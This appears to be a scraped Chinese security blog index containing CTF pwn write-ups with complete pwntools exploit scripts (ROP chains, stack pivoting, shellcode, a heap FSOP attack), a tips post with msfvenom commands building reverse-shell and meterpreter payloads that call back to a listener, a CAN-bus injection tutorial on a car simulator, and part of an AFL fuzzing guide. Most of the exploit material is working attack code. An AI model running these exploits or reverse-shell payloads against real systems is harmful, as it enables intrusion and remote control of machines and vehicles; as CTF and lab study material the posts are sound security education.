u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()pop_rdi=0x0000000000401893puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]ret=0x000000000040101apop_rbp=0x000000000040127dvuln=0x00000000004013C0read_ptr=0x00000000004013CFleave_ret=0x00000000004013bepayload=b&#x27;A&#x27;*0x12s(payload)libc1.srand(0x41414141)for i in range(100):    num=libc1.rand() %100 + 1     print(num)    ru(&quot;Input the authentication code:&quot;)    s(p64(num))ru(&quot;&gt;&gt;&quot;)sl(p32(1))ru(&quot;Note:&quot;)sl(b&#x27;youlin&#x27;)payload=b&#x27;A&#x27;*0x100+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)sl(payload)io.recv()libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x84420lg(&quot;libcbase&quot;)open=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]pop_rsi=libcbase+0x000000000002601fpop_rdx=libcbase+0x0000000000142c92payload=b&#x27;A&#x27;*0x100+p64(elf.bss(0x400)+0x100)+p64(read_ptr)sl(payload)orw=p64(pop_rdi)+p64(0x404538)+p64(pop_rsi)+p64(0)+p64(open)orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(elf.bss(0x900))+p64(pop_rdx)+p64(0x50)+p64(read)orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(elf.bss(0x900))+p64(pop_rdx)+p64(0x50)+p64(write)+b&#x27;flag\\x00&#x27;payload=orw+p64(pop_rbp)+p64(elf.bss(0xb48))+p64(read)payload=payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(elf.bss(0x400)-0x8)+p64(leave_ret)s(payload)ia()\n\nsignin_revenge和上面一题差不多，直接有栈迁移\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./vuln&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 0if local:    io = process(banary)else:    io = remote(&quot;pwn-30cffcb888.challenge.xctf.org.cn&quot;, 9999, ssl=True)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()pop_rdi=0x0000000000401393ret=0x000000000040101aputs_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]vuln=0x00000000004012C0leave_ret=0x00000000004012beread_ptr=0x0000000004012CFpop_rbp=0x000000000040117dru(&quot;lets move and pwn!&quot;)payload=b&#x27;A&#x27;*0x100+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)sl(payload)io.recv()libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x84420lg(&quot;libcbase&quot;)open=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]pop_rsi=libcbase+0x000000000002601fpop_rdx=libcbase+0x0000000000142c92payload=b&#x27;A&#x27;*0x100+p64(elf.bss(0x400)+0x100)+p64(read_ptr)sl(payload)orw=p64(pop_rdi)+p64(0x4044f8)+p64(pop_rsi)+p64(0)+p64(open)orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(elf.bss(0x900))+p64(pop_rdx)+p64(0x50)+p64(read)orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(elf.bss(0x900))+p64(pop_rdx)+p64(0x50)+p64(write)+b&#x27;flag\\x00&#x27;payload=orw+p64(pop_rbp)+p64(elf.bss(0xb48))+p64(read)payload=payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(elf.bss(0x400)-0x8)+p64(leave_ret)s(payload)ia()\n\nezcode套了个json的短shellcode\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./vuln&quot;elf = ELF(banary)# libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(&quot;pwn-ba1369d43c.challenge.xctf.org.cn&quot;, 9999, ssl=True)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io,&quot;b *$rebase(0x00000000000018A6)&quot;)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()shellcode=b&#x27;c1e70c66ba070066b80a000f059931c089ce31ff0f05&#x27;print(hex(len(shellcode)))payload=b&#x27;&#123;&quot;shellcode&quot;:&quot;&#x27;+shellcode+b&#x27;&quot;&#125;&#x27;sl(payload)shellcode = asm(&#x27;&#x27;&#x27;    mov rdi,0x999800d    xor esi,esi    xor rdx,rdx    xor rax,rax    add rax,2    syscall    mov rdi,rax    mov rsi,0x9998000+0x250    add edx,0x100    xor eax,eax    syscall    mov edi,1    mov rsi,0x9998000+0x250    mov rax,1    syscall    &#x27;&#x27;&#x27;)sl(b&#x27;flag\\x00&#x27;.ljust(9,b&#x27;\\x00&#x27;)+shellcode)ia()\n\nqwen套麻了，有溢出 抬下rsp然后执行rop，然后用pwn2复制一下flag到flag_read，就可以直接读flag_read读出flag了\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn1&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 0if local:    io = process(banary)else:    io = remote(&quot;pwn-802264e403.challenge.xctf.org.cn&quot;, 9999, ssl=True)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()libc1 = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)num=libc1.rand()for i in range(5):    ru(&quot;请输入下棋的位置（行 列）：&quot;)    sl(&quot;0 &quot;+str(i))ru(b&#x27;want to say?&#x27;)s(b&#x27;a&#x27;*0x8+b&#x27;\\x08\\x15&#x27;)ru(&quot;Do you want to end the game [Y/N]\\n&quot;)sl(&quot;N&quot;)ru(&quot;：&quot;)sl(&quot;70 &quot;+str(50))ru(b&#x27;administrator key&#x27;)sl(str(num))ru(&quot;logged in!\\n&quot;)sl(&quot;/proc/self/maps&quot;)ru(&quot;as follows &gt;&gt;\\n&quot;)base=int(io.recv(12),16)lg(&quot;base&quot;)io.recvline()io.recvline()io.recvline()libcbase = int(io.recv(12),16)lg(&quot;libcbase&quot;)system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi=libcbase+0x000000000002164fadd_rsp=libcbase+0x0000000000154553#add rsp, 0x50 ; pop rbx ; pop rbp ; pop r12 ; retfor i in range(10):    io.recvline()stack = int(io.recv(12),16) + 0x1E518lg(&quot;stack&quot;)for i in range(5):    ru(&quot;请输入下棋的位置（行 列）：&quot;)    sl(&quot;0 &quot;+str(i))ru(b&#x27;want to say?&#x27;)payload=b&#x27;a&#x27;*0x8+p64(add_rsp)+p64(pop_rdi)+p64(pop_rdi) + p64(bin_sh) + p64(system)s(payload)ru(&quot;Do you want to end the game [Y/N]\\n&quot;)sl(&quot;N&quot;)ru(&quot;请输入下棋的位置（行 列）：&quot;)sl(&quot;70 &quot;+str(50))# sl(b&#x27;cd /home/ctf&#x27;)# sl(b&#x27;./pwn2 -c flag_read flag&#x27;)# sleep(10)# sl(b&#x27;cat flag_read&#x27;)ia()\n\n\nguest book标准的菜单，2.35有uaf直接打apple2就可以了\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 0if local:    io = process(banary)else:    io = remote(ip,port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):    ru(&quot;&gt;&quot;)    sl(str(choice))def add(index,size):    cmd(1)    ru(&quot;[+] input your index&quot;)    sl(str(index))    ru(&quot;[+] input your size&quot;)    sl(str(size))def edit(index,content):    cmd(2)    ru(&quot;[+] input your index&quot;)    sl(str(index))    ru(&quot;[+] input your content&quot;)    s(content)def delete(index):    cmd(3)    ru(&quot;[+] input your index&quot;)    sl(str(index))def show(index):    cmd(4)    ru(&quot;[+] input your index&quot;)    sl(str(index))add(0,0x520)add(1,0x500)add(2,0x510)delete(0)add(3,0x560)delete(2)show(0)io.recv()libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x21b110lg(&quot;libcbase&quot;)one=[0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]onegadget=libcbase+one[1]l_next=libcbase+0x3fe890rtld_global=libcbase+0x3fd040system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+61_IO_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]ret=libcbase+0x0000000000029139pop_rdi=libcbase+0x000000000002a3e5lg(&quot;l_next&quot;)lg(&quot;rtld_global&quot;)edit(0,b&#x27;A&#x27;*0x10)show(0)ru(b&#x27;A&#x27;*0x10)heapbase=uheap()-0x290lg(&quot;heapbase&quot;)edit(0,p64(libcbase+0x21b110)*2+p64(heapbase+0x290)+p64(_IO_list_all-0x20))add(4,0x590)fake_heap=heapbase+0x1200IO_wfile_jumps = libcbase + 0x2170c0lg(&quot;fake_heap&quot;)fake_file = b&#x27;&#x27;fake_file = p64(0)+p64(1)fake_file = fake_file.ljust(0x80,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0xb8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_fileedit(2,payload)payload = b&#x27;&#x27;payload = payload.ljust(0x58,b&#x27;\\x00&#x27;)+p64(setcontext)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(fake_heap+0xf0)+p64(ret)payload = payload.ljust(0xc0,b&#x27;\\x00&#x27;)+p64(fake_heap)+p64(0)*3+p64(fake_heap-0x10)+p64(0)payload +=p64(pop_rdi)+p64(bin_sh)+p64(system)edit(3,payload)cmd(5)ia()\n"},{"title":"技巧记录","url":"/2023/09/25/%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/","content":"VMware每次重启共享文件夹失效主要原因是在linux系统启动时vmhgfs-fuse不会启动。\n最简单的办法是在共享文件夹设置中禁用，再启用。但是太麻烦了。\n直接在fstab文件系统表中添加一个条目即可。编辑&#x2F;etc&#x2F;fstab在最下面添加一行。\nvmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0\n\n固件解包网站https://zhiwanyuzhou.com/multiple_analyse&#x2F;firmware&#x2F;\npip install安装包代理pip install angr -i https://pypi.tuna.tsinghua.edu.cn/simple\n\n异构内核文件系统下载https://people.debian.org/~aurel32/qemu/\ndocker stop显示权限不足输入下面指令再进行stop就可以了\nsudo aa-remove-unknown\n\n异构反弹shell的shellcode生成msfvenom --format python --payload linux/mipsle/shell_reverse_tcp LHOST=192.168.182.131 LPORT=8888\n\n以python的形式打印出来\n\niot反弹shell马生成msfvenom -p linux/mipsle/meterpreter/reverse_tcp LHOST=192.168.182.137 LPORT=8888 -f elf &gt; msf\n\n使用python起一个http服务，然后使用wget将生成的木马传输进本地\npython -m http.server\n\n然后先使用msfconsole监听端口\nmsfconsoleuse exploit/multi/handlerset payload linux/mipsle/meterpreter/reverse_tcpset LHOST 192.168.0.12set LPORT 8888run\n\n然后运行一下就会弹shell了，同时也可以进行文件传输了\n\n\n"},{"title":"栈迁移_改rbp打法","url":"/2023/09/25/%E6%A0%88%E8%BF%81%E7%A7%BB-%E6%94%B9rbp%E6%89%93%E6%B3%95/","content":"Login\nbuf有一个0x10字节的溢出，只可以控制rbp和返回地址，然后可以往程序的bss段上写一个内容（这个bss的输入在控制rbp的打法上其实并不需要）\nbss=elf.bss(0x800)pop_rdi=0x00000000004013d3leave=0x000000000040136eputs_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]ret=0x000000000040101aptr_addr = 0x401316pop_rbp=0x00000000004011bdru(&quot;Enter your password:&quot;)payload=b&#x27;A&#x27;*0xf0+p64(bss+0xf0)+p64(ptr_addr)s(payload)ru(&quot;Enter your password:&quot;)s(b&#x27;AAAA&#x27;)payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(elf.bss(0xbf8))+p64(ptr_addr)payload=payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(bss-0x8)+p64(leave)s(payload)sleep(1)s(b&#x27;AAAA&#x27;)libcbase=uu64()-libc.sym[&#x27;puts&#x27;]lg(&quot;libcbase:&quot;+hex(libcbase))system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))\n\n这里利用的是程序本身的一个read的输入\n\n这里的一个read的输入是通过rbp的值的一个索引，输入向rbp-0xf0的位置，所以上面的exp将rbp修改为bss+0xf0最后会输入到bss的位置处，调用完read后在bss段上部署rop链，泄露libc。并且将rbp修改为bss+0xbf8，然后接着调用read\npayload=p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)payload=payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(elf.bss(0xb00))+p64(leave)s(payload)sleep(1)s(b&#x27;AAAA&#x27;)ia()\n\n接着在0xb00处构造system(”&#x2F;bin&#x2F;sh”)的rop链\n完整exp:\nfrom operator import lefrom pwn import *from ctypes import *from struct import packbanary = &quot;./login&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;175.20.7.11&#x27;port = 9999local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()bss=elf.bss(0x800)pop_rdi=0x00000000004013d3leave=0x000000000040136eputs_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]ret=0x000000000040101aptr_addr = 0x401316pop_rbp=0x00000000004011bdru(&quot;Enter your password:&quot;)payload=b&#x27;A&#x27;*0xf0+p64(bss+0xf0)+p64(ptr_addr)s(payload)ru(&quot;Enter your password:&quot;)s(b&#x27;AAAA&#x27;)payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(elf.bss(0xbf8))+p64(ptr_addr)payload=payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(bss-0x8)+p64(leave)s(payload)sleep(1)s(b&#x27;AAAA&#x27;)libcbase=uu64()-libc.sym[&#x27;puts&#x27;]lg(&quot;libcbase:&quot;+hex(libcbase))system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))payload=p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)payload=payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(elf.bss(0xb00))+p64(leave)s(payload)sleep(1)s(b&#x27;AAAA&#x27;)ia()\n"},{"title":"车联网can总线协议初探","url":"/2024/08/13/%E8%BD%A6%E8%81%94%E7%BD%91can%E6%80%BB%E7%BA%BF%E5%8D%8F%E8%AE%AE%E5%88%9D%E6%8E%A2/","content":"can总线协议CAN总线协议（Controller Area Network）是一种用于车联网的串行通信协议。它最初由德国Bosch公司在20世纪80年代为汽车电子控制系统而开发，旨在解决不同电子控制单元（ECU）之间的通信问题。以下是CAN总线协议的一些关键特点：\n\n高可靠性和实时性：CAN协议支持快速的数据传输和错误检测与纠正，确保了通信的高可靠性和实时性。\n多主架构：CAN总线是一种多主（multi-master）架构，这意味着任何节点都可以在总线上发送消息，无需中央控制器。\n短帧格式：CAN总线使用短帧格式（8字节的数据），这使得通信效率高，且可以满足汽车控制系统对实时性的要求。\n错误检测机制：CAN协议具有多种错误检测机制，如位填充、帧校验、应答校验和错误检测码，以确保数据传输的完整性和可靠性。\n消息优先级：CAN总线协议使用消息标识符来确定优先级。较低数值的标识符拥有更高的优先级，这使得紧急信息可以优先传输。\n速度和距离：CAN协议支持的最大传输速率可达1Mbps，但速率和距离成反比。典型的汽车应用中，CAN总线的长度可达几百米。\n应用广泛：除了汽车领域，CAN总线协议还广泛应用于工业自动化、医疗设备和其他需要可靠通信的嵌入式系统中。\n扩展性：CAN总线可以与其他网络协议（如CAN FD、LIN、FlexRay等）集成，以满足更高的数据速率和功能需求。\n\nCAN总线协议在车联网中发挥着关键作用，使得不同的汽车电子控制单元可以有效地协同工作，提升了汽车的智能化和自动化水平。\nICSim模拟ICSim 包括一个带有车速表、门锁指示灯、转向信号灯和控制面板的仪表板。模拟控制器允许用户与模拟汽车网络进行交互，应用加速、刹车、控制门锁和转向信号。所以可以通过ICSim模拟汽车的行为，并抓取ICSim的can报文\n安装ICSim环境，需要首先安装ICSim所需依赖库：\nsudo apt install libsdl2-dev libsdl2-image-dev\n\n要发送、接收和分析 CAN 包，我们需要 CAN 分析工具。Can-utils 是一组 Linux 实用程序，允许 Linux 与车载 CAN 网络进行通信。Can-utils 包含 4个我们经常使用的主要工具：\nsudo apt install can-utils#candump : 显示、过滤和记录CAN数据到文件。candump并不会解码数据。#canplayer : 对记录的CAN数据进行重放。#cansend : 发送CAN数据。#cansniffer : 显示CAN数据并高亮显示变化的字节。\n\n然后将ICSim下载下来\ngit clone https://github.com/zombiecraig/IcSim.git\n\n切换到ICSim目录，执行”make”命令，就可以编译成功。编译成功后，先运行setup_vcan.sh文件创建vcan0网卡\n然后执行.&#x2F;icsim vcan0\n\n接着另起一个窗口执行.&#x2F;controls vcan0\n\n下面，我们可以使用如下键位来操作控制器\n上方向键加速向左方向键左转向右方向键右转右shift+A/X开左车门（前/后）右shift+B/Y开右前车门（前/后）左shift+A/X关左车门（前/后）左shift+B/Y关右前车门（前/后）\n\n\n我们可以使用”candump vcan0”来抓取CAN包裹流量，这时我们对控制器进行操作就会抓取相应命令的流量。如下图，左侧可以看到抓取的流量直接打印到屏幕上，显示流量时还是比较乱的\n\n这时我们可以使用”candump -l vcan0”，candump会自动将抓取的流量包放入candump-xxx.log文件中\n\n想要停止抓取可以按”ctrl+c”。查看一下抓取流量包，第一列，括号内的是时间戳，第二列中vcan0为我们的虚拟can接口。后面的是ID和数据，ID和数据以#号分割。\n\ncandump可以监听并记录原始数据，会有很多对我们无用的数据。can-utils工具包中还有一款可以根据仲裁ID进行分组显示，并对变化的数据以红色显示，使我们比较容易分辨，它就是cansniffer。我们使用”cansniffer -c vcan0”命令来对vcan0进行监听。\n\n我们可以测试一下，当我按下左方向键时，仪表盘开始出现左转向的灯。同时左侧的流量包开始变动，但是不太好观察到哪里出现了变化。\n\n看网上的文章可以截图将ID这 一列固定在左侧，然后进行左转向的时候观察哪里发生了变化，这里就不详细截图了，直接说结果吧，最终发现”188#01000000”这一条是对转向进行操作的包裹，然后用同样的方法可以发现右转向是”188#02000000”，我们也可以使用cansend进行验证\ncansend vcan0 188#01000000\n\n\n测试加油的指令时，上面的操作也可以比较方便的分析出加油指令ID和数据。这里不在重复讲解，上面的方法固然好用，但是也有不适用的时候，比如情况比较复杂，出现的ID变化或者较多。我们还有一种方法可以分析出对车辆的指令。我们首先使用”candump -l vcan0”进行流量抓取，抓取过程中进行加油门操作，然后松开油门，使其速度将为最低，最后停止抓取流量。这样一来，整个的过程就可以抓取到log文件中。我们使用重放的发送，发送这个log文件中的所有内容。\n命令如下，使用”canplayer -I candump-xxx.log”命令就会将抓取到的流量重新发送一边。发送后可以观察到我们上面加速和减速的整个过程，接下里我们就要使用二分法截取加速的部分。\n\n最后经过分析，发现”244#0000001xxx”即为加速指令。我们重放后，可以观察到加速现象。\nFuzzing我们可以使用savvyCAN工具对can协议进行fuzz测试。\nsavvyCAN安装过程如下，\n首先需要安装qt环境，这里我使用5.14.2版本(https://download.qt.io/archive/qt/5.14/5.14.2/)(savvyCAN环境要求&gt;=5.14.0版本)，下载&quot;.run&quot;的在线安装程序，然后其赋予执行权限(chmod 755 qt-xxx.run)，使用”.&#x2F;qt-xxx.run”进行安装，这里我安装完毕后的目录为”~&#x2F;Qt5.14.2&#x2F;5.14.2”。\nSavvyCAN的安装安装SavvyCAN是一个非常容易和简单的过程。您可以通过https:&#x2F;&#x2F;www.savvycan.com，下载适用于Linux、Mac和Windows平台的预编译二进制文件。\nwget https://github.com/collin80/SavvyCAN/releases/download/V199.1/SavvyCAN-305dafd-x86_64.AppImage\n\n下载appimage时，无需安装，直接运行相应的可执行文件即可！\nchmod 777 SavvyCAN-305dafd-x86_64.AppImage./SavvyCAN-305dafd-x86_64.AppImage\n\n运行SavvyCAN后，我们可以看到：\n\n如果我们打算将SavvyCAN与ICSim搭配使用，所以，我们还需要安装qtserialbus。\n安装qt5wget https://download.qt.io/official_releases/qt/5.14/5.14.4/qt-opensource-linux-x64-5.14.2.run\n\n下载qt5后，我们需要安装&#x2F;运行它，具体命令如下所示：\nchmod 777 qt-opensource-linux-x64-5.14.2.run./qt-opensource-linux-x64-5.14.2.run\n\n记下路由名称，因为后面会用到的。\n一旦安装了qt5，接下来就得安装qtserialbus了，因为该软件没有包含在官方的Ubuntu存储库中，所以，我们还得自己动手，才能丰衣足食。\n$ sudo apt install qtdeclarative5-dev qttools5-dev g ++$ git clone https://github.com/qt/qtserialbus$ cd qtserialbus$ /home/youlin/Qt5.14.2/5.14.2/gcc_64/bin/qmake .$ make\n\n编译SavvyCAN为了使用qtserialbus，我们还需要通过qmake编译之前下载的SavvyCAN的AppImage文件，具体命令如下所示：\n$ git clone https://github.com/collin80/SavvyCAN $ cd SavvyCAN $ /home/y0g3sh/Qt5.14.2/5.14.2/gcc_64/bin/qmake CONFIG + = debug $ make\n\n启动SavvyCAN启动我们刚刚编译好的SavvyCAN，而不是我们之前下载的appimage文件。\n请记住，如果您想在真正的汽车上运行它，而不是使用qtserialbus的话，则可以直接使用appimage文件，而不必费劲巴拉地编译SavvyCAN了。\n这样就可以连接到我们的ICSim了\n\nsavvyCAN工具部分功能与我们上面使用的can-utils工具相同，下图为RE tools中的sniffer功能，与我们上面操作使用的cansniffer功能相同，但是savvyCAN中变化的数据使用了颜色进行标记，更便于我们辨识数据。\n\nsavvyCAN工具的重点即为fuzz功能，点击”Send Frames-fuzzing”就会出现下图中的fuzzing window，这个窗口中的功能适用于我们想要fuzz否个ID范围，并且可以自定义fuzz的数据。\n下图中为我测试0x244 ID的fuzz效果\n"},{"title":"通过afl-traning学习afl-fuzz","url":"/2024/01/14/%E9%80%9A%E8%BF%87afl-traning%E5%AD%A6%E4%B9%A0afl-fuzz/","content":"前言本文是记录通过afl-training熟悉afl-fuzz的一些用法\n关于afl-fuzz的安装以及一些基础的使用在前面的文章已经提到过了，这里就不再赘述了\n参考文章:\nhttps://tttang.com/archive/1508/#toc_0x01-quickstart\nafl-training项目地址:\nhttps://github.com/mykter/afl-training\nquickstartquickstart是通过一个简单的程序来体验afl-fuzz的使用过程\n编译里面的vulnerable.c\ncd quickstartCC=afl-clang-fast AFL_HARDEN=1 make\n\n第二行命令是将编译器换成了afl-clang-fast并加入了环境变量AFL_HARDEN&#x3D;1，然后进行make\n查看一下makefile:\nyoulin@ubuntu:~/afl/afl-training/quickstart$ cat Makefile # Enable debugging and suppress pesky warningsCFLAGS ?= -g -wall:\tvulnerableclean:\trm -f vulnerablevulnerable: vulnerable.c\t$&#123;CC&#125; $&#123;CFLAGS&#125; vulnerable.c -o vulnerable\n\nmake默认会编译all，all编译的是vulnerable,所以最终会形成afl-clang-fast -g -w vulnerable.c -o vulnerable。\nvulnerable.c的源代码:\n$ cat vulnerable.c#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#define INPUTSIZE 100int process(char *input)&#123;        char *out;        char *rest;        int len;        if (strncmp(input, &quot;u &quot;, 2) == 0)        &#123; // upper case command                char *rest;                len = strtol(input + 2, &amp;rest, 10); // how many characters of the string to upper-case                rest += 1;                                                      // skip the first char (should be a space)                out = malloc(len + strlen(input));  // could be shorter, but play it safe                if (len &gt; (int)strlen(input))                &#123;                        printf(&quot;Specified length %d was larger than the input!\\n&quot;, len);                        return 1;                &#125;                else if (out == NULL)                &#123;                        printf(&quot;Failed to allocate memory\\n&quot;);                        return 1;                &#125;                for (int i = 0; i != len; i++)                &#123;                        out[i] = rest[i] - 32; // only handles ASCII                &#125;                out[len] = 0;                strcat(out, rest + len); // append the remaining text                printf(&quot;%s&quot;, out);                free(out);        &#125;        else if (strncmp(input, &quot;head &quot;, 5) == 0)        &#123; // head command                if (strlen(input) &gt; 6)                &#123;                        len = strtol(input + 4, &amp;rest, 10);                        rest += 1;                // skip the first char (should be a space)                        rest[len] = &#x27;\\0&#x27;; // truncate string at specified offset                        printf(&quot;%s\\n&quot;, rest);                &#125;                else                &#123;                        fprintf(stderr, &quot;head input was too small\\n&quot;);                &#125;        &#125;        else if (strcmp(input, &quot;surprise!\\n&quot;) == 0)        &#123;                // easter 